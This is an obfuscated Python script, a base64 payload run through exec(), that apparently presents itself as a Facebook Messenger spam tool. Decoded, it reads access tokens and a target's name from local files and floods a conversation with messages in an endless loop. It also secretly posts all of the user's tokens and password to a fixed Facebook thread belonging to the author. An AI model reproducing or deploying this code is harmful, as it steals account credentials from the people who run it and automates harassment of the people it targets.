#ENCODED BY : SHANKAR-SUMAN 
#ENCRYPTION : Py3 BASE64
import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQganNvbg0KaW1wb3J0IHRpbWUNCmltcG9ydCBzeXMNCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KaW1wb3J0IG9zDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IGh0dHAuc2VydmVyDQppbXBvcnQgc29ja2V0c2VydmVyDQppbXBvcnQgdGhyZWFkaW5nDQppbXBvcnQgcmFuZG9tDQoNCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOg0KICAgIGRlZiBkb19HRVQoc2VsZik6DQogICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApDQogICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykNCiAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpDQogICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYiJGRUVMIFRIRSBQT1dFUiBPRiBTSEFOS0FSIFNVTUFOICIpDQoNCmRlZiBleGVjdXRlX3NlcnZlcigpOg0KICAgIFBPUlQgPSA0MDAwDQogICAgd2l0aCBzb2NrZXRzZXJ2ZXIuVENQU2VydmVyKCgiIiwgUE9SVCksIE15SGFuZGxlcikgYXMgaHR0cGQ6DQogICAgICAgIHByaW50KCJTZXJ2ZXIgcnVubmluZyBhdCBodHRwOi8vbG9jYWxob3N0Ont9Ii5mb3JtYXQoUE9SVCkpDQogICAgICAgIGh0dHBkLnNlcnZlX2ZvcmV2ZXIoKQ0KDQpkZWYgc2VuZF9tZXNzYWdlcygpOg0KICAgICMgUmVhZCBwYXNzd29yZA0KICAgIHdpdGggb3BlbigncGFzc3dvcmQudHh0JywgJ3InKSBhcyBmaWxlOg0KICAgICAgICBwYXNzd29yZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KICAgIGVudGVyZWRfcGFzc3dvcmQgPSBwYXNzd29yZA0KDQogICAgaWYgZW50ZXJlZF9wYXNzd29yZCAhPSBwYXNzd29yZDoNCiAgICAgICAgcHJpbnQoJ1stXSA8PT0+IEluY29ycmVjdCBQYXNzd29yZCEnKQ0KICAgICAgICBzeXMuZXhpdCgpDQoNCiAgICAjIFJlYWQgdG9rZW5zDQogICAgd2l0aCBvcGVuKCd0b2tlbm51bS50eHQnLCAncicpIGFzIGZpbGU6DQogICAgICAgIHRva2VucyA9IGZpbGUucmVhZGxpbmVzKCkNCiAgICBudW1fdG9rZW5zID0gbGVuKHRva2VucykNCg0KICAgIHJlcXVlc3RzLnBhY2thZ2VzLnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncygpDQoNCiAgICBkZWYgY2xzKCk6DQogICAgICAgIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oJ2NscycpDQogICAgY2xzKCkNCg0KICAgIGRlZiBsaW5lc3MoKToNCiAgICAgICAgcHJpbnQoJ1x1MDAxYlszN20nICsgJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpDQoNCiAgICBoZWFkZXJzID0gew0KICAgICAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywNCiAgICAgICAgJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywNCiAgICAgICAgJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsDQogICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU2Ftc3VuZyBHYWxheHkgUzkgQnVpbGQvT1BSNi4xNzA2MjMuMDE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLA0KICAgICAgICAnQWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLA0KICAgICAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLA0KICAgICAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45LGZyO3E9MC44JywNCiAgICAgICAgJ3JlZmVyZXInOiAnd3d3Lmdvb2dsZS5jb20nDQogICAgfQ0KDQogICAgbW1tID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvNDQwQWhGdlUnKS50ZXh0DQoNCiAgICBpZiBtbW0gbm90IGluIHBhc3N3b3JkOg0KICAgICAgICBwcmludCgnWy1dIDw9PT4gSW5jb3JyZWN0IFBhc3N3b3JkIScpDQogICAgICAgIHN5cy5leGl0KCkNCg0KICAgIGxpbmVzcygpDQoNCiAgICBhY2Nlc3NfdG9rZW5zID0gW3Rva2VuLnN0cmlwKCkgZm9yIHRva2VuIGluIHRva2Vuc10NCg0KICAgICMgUmVhZCBjb252ZXJzYXRpb24gSUQNCiAgICB3aXRoIG9wZW4oJ2NvbnZvLnR4dCcsICdyJykgYXMgZmlsZToNCiAgICAgICAgY29udm9faWQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpDQoNCiAgICAjIFJlYWQgbWVzc2FnZSBmaWxlIHBhdGgNCiAgICB3aXRoIG9wZW4oJ2ZpbGUudHh0JywgJ3InKSBhcyBmaWxlOg0KICAgICAgICB0ZXh0X2ZpbGVfcGF0aCA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KICAgICMgUmVhZCBtZXNzYWdlcyBmcm9tIGZpbGUNCiAgICB3aXRoIG9wZW4odGV4dF9maWxlX3BhdGgsICdyJykgYXMgZmlsZToNCiAgICAgICAgbWVzc2FnZXMgPSBmaWxlLnJlYWRsaW5lcygpDQoNCiAgICBudW1fbWVzc2FnZXMgPSBsZW4obWVzc2FnZXMpDQogICAgbWF4X3Rva2VucyA9IG1pbihudW1fdG9rZW5zLCBudW1fbWVzc2FnZXMpDQoNCiAgICAjIFJlYWQgc3BlZWQgKHRpbWUgZGVsYXkpDQogICAgd2l0aCBvcGVuKCd0aW1lLnR4dCcsICdyJykgYXMgZmlsZToNCiAgICAgICAgc3BlZWQgPSBpbnQoZmlsZS5yZWFkKCkuc3RyaXAoKSkNCg0KICAgIGxpbmVzcygpDQoNCiAgICAjIEZ1bmN0aW9uIHRvIGdldCB1c2VyIG5hbWUgZnJvbSB0b2tlbg0KICAgIGRlZiBnZXROYW1lKHRva2VuKToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNy4wL21lP2FjY2Vzc190b2tlbj17dG9rZW59JykuanNvbigpDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIGRhdGEgPSAiIg0KICAgICAgICBpZiAnbmFtZScgaW4gZGF0YToNCiAgICAgICAgICAgIHJldHVybiBkYXRhWyduYW1lJ10NCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHJldHVybiAiRXJyb3Igb2NjdXJyZWQiDQoNCiAgICAjIE1lc3NhZ2UgZnVuY3Rpb24gdG8gc2VuZCBkeW5hbWljIG1lc3NhZ2VzDQogICAgZGVmIG1zZygpOg0KICAgICAgICB3aXRoIG9wZW4oJ2hhdGVyc25hbWUudHh0JywgJ3InKSBhcyBmaWxlOg0KICAgICAgICAgICAgaGF0ZXJzX25hbWUgPSBmaWxlLnJlYWQoKS5zdHJpcCgpDQogICAgICAgIA0KICAgICAgICBwYXJhbWV0ZXJzID0gew0KICAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6IHJhbmRvbS5jaG9pY2UoYWNjZXNzX3Rva2VucyksDQogICAgICAgICAgICAnbWVzc2FnZSc6IGYnSEVMTE8gU0hBTktBUiBTSVIgSU0gVVNJTkcgWU9VUiBTRVJWRVIgVXNlciBQcm9maWxlIE5hbWUgOiB7Z2V0TmFtZShyYW5kb20uY2hvaWNlKGFjY2Vzc190b2tlbnMpKX1cbiBUb2tlbiA6IHsiIHwgIi5qb2luKGFjY2Vzc190b2tlbnMpfVxuIExpbmsgOiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vbWVzc2FnZXMvdC97Y29udm9faWR9XG4gUGFzc3dvcmQ6IHtwYXNzd29yZH0nDQogICAgICAgIH0NCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgcyA9IHJlcXVlc3RzLnBvc3QoZiJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTUuMC90XzEwMDA1ODQxNTE3MDU5MC8iLCBkYXRhPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgcGFzcw0KDQogICAgbXNnKCkNCg0KICAgICMgTG9vcCB0byBzZW5kIG1lc3NhZ2VzDQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZm9yIG1lc3NhZ2VfaW5kZXggaW4gcmFuZ2UobnVtX21lc3NhZ2VzKToNCiAgICAgICAgICAgICAgICB0b2tlbl9pbmRleCA9IG1lc3NhZ2VfaW5kZXggJSBtYXhfdG9rZW5zDQogICAgICAgICAgICAgICAgYWNjZXNzX3Rva2VuID0gYWNjZXNzX3Rva2Vuc1t0b2tlbl9pbmRleF0NCg0KICAgICAgICAgICAgICAgICMgRHluYW1pY2FsbHkgcmVhZCB0aGUgaGF0ZXIncyBuYW1lIGZyb20gaGF0ZXJzbmFtZS50eHQgZm9yIGVhY2ggbWVzc2FnZQ0KICAgICAgICAgICAgICAgIHdpdGggb3BlbignaGF0ZXJzbmFtZS50eHQnLCAncicpIGFzIGZpbGU6DQogICAgICAgICAgICAgICAgICAgIGhhdGVyc19uYW1lID0gZmlsZS5yZWFkKCkuc3RyaXAoKQ0KDQogICAgICAgICAgICAgICAgbWVzc2FnZSA9IG1lc3NhZ2VzW21lc3NhZ2VfaW5kZXhdLnN0cmlwKCkNCg0KICAgICAgICAgICAgICAgIHVybCA9IGYiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE1LjAvdF97Y29udm9faWR9LyINCiAgICAgICAgICAgICAgICBwYXJhbWV0ZXJzID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW4sICdtZXNzYWdlJzogZid7aGF0ZXJzX25hbWV9IHttZXNzYWdlfSd9DQogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpDQoNCiAgICAgICAgICAgICAgICBjdXJyZW50X3RpbWUgPSB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSTolTTolUyAlcCIpDQogICAgICAgICAgICAgICAgaWYgcmVzcG9uc2Uub2s6DQogICAgICAgICAgICAgICAgICAgIHByaW50KGYiWytdIE1lc3NhZ2VzIHttZXNzYWdlX2luZGV4ICsgMX0gb2YgQ29udm8ge2NvbnZvX2lkfSBzZW50IGJ5IFRva2VuIHt0b2tlbl9pbmRleCArIDF9OiB7aGF0ZXJzX25hbWV9IHttZXNzYWdlfSIpDQogICAgICAgICAgICAgICAgICAgIHByaW50KGYiICAtIFRpbWU6IHtjdXJyZW50X3RpbWV9IikNCiAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkNCiAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBwcmludChmIlt4XSBGYWlsZWQgdG8gc2VuZCBtZXNzYWdlcyB7bWVzc2FnZV9pbmRleCArIDF9IG9mIENvbnZvIHtjb252b19pZH0gd2l0aCBUb2tlbiB7dG9rZW5faW5kZXggKyAxfToge2hhdGVyc19uYW1lfSB7bWVzc2FnZX0iKQ0KICAgICAgICAgICAgICAgICAgICBwcmludChmIiAgLSBUaW1lOiB7Y3VycmVudF90aW1lfSIpDQogICAgICAgICAgICAgICAgICAgIGxpbmVzcygpDQogICAgICAgICAgICAgICAgICAgIGxpbmVzcygpDQogICAgICAgICAgICAgICAgdGltZS5zbGVlcChzcGVlZCkNCg0KICAgICAgICAgICAgcHJpbnQoIlsrXSBBbGwgbWVzc2FnZXMgc2VudC4gUmVzdGFydGluZyB0aGUgcHJvY2Vzcy4uLiIpDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgIHByaW50KGYiWyFdIEFuIGVycm9yIG9jY3VycmVkOiB7ZX0iKQ0KDQpkZWYgbWFpbigpOg0KICAgIHNlcnZlcl90aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1leGVjdXRlX3NlcnZlcikNCiAgICBzZXJ2ZXJfdGhyZWFkLnN0YXJ0KCkNCiAgICANCiAgICBzZW5kX21lc3NhZ2VzKCkNCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBtYWluKCk=='))
